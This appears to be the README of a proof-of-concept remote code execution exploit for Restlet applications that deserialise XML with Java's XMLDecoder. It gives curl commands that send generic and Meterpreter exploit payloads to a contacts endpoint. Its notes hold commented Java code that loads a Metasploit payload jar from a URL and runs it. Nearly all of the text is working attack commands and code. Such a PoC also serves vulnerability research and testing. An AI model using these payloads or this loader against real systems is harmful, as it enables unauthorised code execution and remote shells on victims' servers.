## RestletXMLDecoder

RCE Exploit PoC for Restlet application using XMLDecoder as Unmarshaler

Expected use:
curl -X PUT --header "content-type: application/x-java-serialized-object+xml" --data @contact.xml "http://localhost:8180/contacts"

Generic Exploit:
curl -X PUT --header "content-type: application/x-java-serialized-object+xml" --data @contact-rce.xml "http://localhost:8180/contacts"

Meterpreter Exploit:
curl -X PUT --header "content-type: application/x-java-serialized-object+xml" --data @contact-met.xml "http://localhost:8180/contacts"

Notes:

            // URLClassLoader u = new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")});
            // Class c = u.loadClass("metasploit.Payload");
            // c.newInstance();
            // try {
            //    c.getMethod("main",new Class[]{Class.forName("[Ljava.lang.String;")}).invoke(null,new Object[]{new String[0]});
            // } catch (Exception e) {
            //    e.printStackTrace();
            // }
